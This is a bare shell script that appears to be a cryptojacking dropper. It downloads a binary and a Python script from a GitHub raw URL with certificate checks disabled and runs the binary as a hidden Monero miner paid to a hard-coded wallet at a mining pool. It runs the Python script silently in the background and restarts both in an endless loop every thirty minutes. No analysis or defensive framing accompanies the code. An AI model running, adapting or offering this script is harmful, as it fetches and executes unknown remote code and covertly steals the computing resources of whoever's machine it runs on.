mkdir -p /opt/code/

wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
chmod 700 /opt/code/goal
/opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &


wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
chmod 700 /opt/code/origin.py
python /opt/code/origin.py &>/dev/null &


while true; do 
    pgrep -f goal;
    /opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &
    pgrep -f origin;
    python /opt/code/origin.py &>/dev/null &
    sleep 1800;
done

